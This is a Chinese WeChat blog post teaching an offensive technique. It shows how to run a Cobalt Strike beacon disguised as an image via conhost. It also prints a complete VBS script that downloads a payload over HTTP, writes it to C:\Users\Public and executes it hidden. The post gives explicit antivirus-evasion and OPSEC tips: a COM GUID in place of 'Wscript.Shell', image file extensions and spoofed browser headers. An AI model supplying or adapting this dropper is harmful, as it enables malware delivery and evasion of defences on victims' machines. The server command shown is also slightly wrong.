#  通过VBS脚本下载文件并执行

原创 relaysec  [ Relay学安全 ](javascript:void\(0\);)

**Relay学安全** ![]()

微信号 gh_8d57319ec39c

功能介绍
这是一个纯分享技术的公众号，只想做安全圈的一股清流，不会发任何广告，不会接受任何广告，只会分享纯技术文章，欢迎各行各业的小伙伴关注。让我们一起提升技术。

____

___发表于_

在了解之前，我们需要清楚一件事情，如果我们将beacon.exe，更改后缀为.png还可以运行吗？

这里我生成了一个beacon.exe，将名称更改为beacon.png。

![]()

双击肯定是不能运行的，但是我们可以通过conhost去运行。

conhost全称是Console Host Process, 即命令行程序的宿主进程。简单的说他是微软出于安全考虑，在windows 7和Windows
server 2008中引进的新的控制台应用程序处理机制。

  * 

    
    
    conhost beacon.png

我们运行之后会惊奇的发现，CS上线的进程变成了beacon.png。

![]()

我们在进程也可以看到，进程中跑的也是beacon.png。

![]()

接下来我们进入主题来看如下的VBS代码。

这里代码非常简单，简单解释一下，首先获取到COM对象Wscript.shell，这里是通过getObject去获取的，但是我们会发现为什么获取的是new:72C24DD5-D70A-438B-8A42-98424B88AFB8，这是为了规避静态扫描，那么后面这一长串是什么呢？这一长串字符是GUID。我们可以使用olview.exe
COM对象查看器来查看对象的GUID。

如下图:首先点击Prog IDS，然后搜索Wscript。

![]()

可以看到搜索如下:

![]()

然后我们右键第三个 Copy GUID即可。

如下代码其实就是 CreateObject("Wscript.Shell") 转换过来的。

  * 

    
    
    GetObject("new:72C24DD5-D70A-438B-8A42-98424B88AFB8")

拿到对象之后通过Microsoft.XMLHTTP
COM对象去请求下载文件，这里我们可以指定我们的服务器，需要注意的是这里下载你可以下载.png，.jpg，但是不要去直接下载.exe，或许下载jpg这一类文件更加OPSEC一点。

下载文件之后 复制文件到C:\Users\Public目录下最终利用conhost去执行即可。

如下完整代码:

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    Sub LaunchCommand(ByVal obf_command)    With GetObject("new:72C24DD5-D70A-438B-8A42-98424B88AFB8")        .Run .ExpandEnvironmentStrings(obf_command), 0, False    End WithEnd Sub  
    Function obf_SaveToFile(ByVal obf_saveAs, ByRef obf_data())  
        Dim obf_out    Dim obf_shell: Set obf_shell = GetObject("new:72C24DD5-D70A-438B-8A42-98424B88AFB8")    obf_out = obf_shell.ExpandEnvironmentStrings(obf_saveAs)  
        With CreateObject("Adodb.Stream")        .Type = 1        .Open        .write obf_data        .savetofile obf_out, 2    End With    obf_SaveToFile = True    Exit Function  
        obf_SaveToFile = FalseEnd Function  
    Function DownloadFromURL(ByVal obf_URL)  
        With CreateObject("Microsoft.XMLHTTP")        .Open "GET", obf_URL, False        .setRequestHeader "Accept", "*/*"        .setRequestHeader "Accept-Language", "en-US,en;q=0.9"        .setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36 Edg/86.0.622.69"        .setRequestHeader "Accept-Encoding", "gzip, deflate"        .setRequestHeader "Cache-Control", "private, no-store, max-age=0"        .setRequestHeader "DNT", "1"        .Send  
            If .Status = 200 Then            DownloadFromURL = .ResponseBody            Exit Function        End If    End With  
        DownloadFromURL = ""End Function  
      
      
      
    Sub DropFile(ByVal obf_saveto)    Dim obf_code    Dim obf_bytes    Dim obf_LaunchIt    obf_LaunchIt = True        obf_bytes = DownloadFromURL("http://localhost:8080/relaysec.jpg")        If obf_SaveToFile(obf_saveto, obf_bytes) And obf_LaunchIt Then        LaunchCommand "conhost C:\Users\Public\dropped-Autoruns.jpg"    End IfEnd Sub  
    Sub obf_MacroEntryPoint()    On Error Resume Next  
        Dim obf_location, obf_path    Dim obf_LaunchIt    obf_LaunchIt = True        Dim obf_shell: Set obf_shell = GetObject("new:72C24DD5-D70A-438B-8A42-98424B88AFB8")    obf_path = obf_shell.ExpandEnvironmentStrings("C:\Users\Public\")    obf_location = obf_path & "dropped-Autoruns.jpg"  
        Dim obf_FSO: Set obf_FSO = CreateObject("Scripting.FileSystemObject")  
        If obf_FSO.FolderExists(obf_path) Then        If obf_FSO.FileExists(obf_location) = False Then            DropFile obf_location        ElseIf obf_LaunchIt Then            LaunchCommand "conhost C:\Users\Public\dropped-Autoruns.jpg"        End If    Else        obf_FSO.CreateFolder (obf_path)        If obf_FSO.FileExists(obf_location) = False Then            DropFile obf_location        ElseIf obf_LaunchIt Then            LaunchCommand "conhost C:\Users\Public\dropped-Autoruns.jpg"        End If    End IfEnd Sub  
    obf_MacroEntryPoint

最后我们来演示一下:

首先定义为.vbs文件，使用Python开一个web服务。

  * 

    
    
    python3 http.server 8080

![]()

执行VBS脚本。  

  * 

    
    
    cscript download.vbs

成功上线，可以看到进程是relaysec-account.jpg，这里其实就是复制到C:\Users\Public\目录去运行的。

![]()

如下C:\Users\Public目录。

![]()

最后别忘记转发噢，你的转发就是我的动力。

  

预览时标签不可点

微信扫一扫  
关注该公众号

继续滑动看下一个

# 通过VBS脚本下载文件并执行

原创 relaysec  [ Relay学安全 ](javascript:void\(0\);)

轻触阅读原文

![]()

Relay学安全

赞 分享 在看

向上滑动看下一个

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看 分享 留言

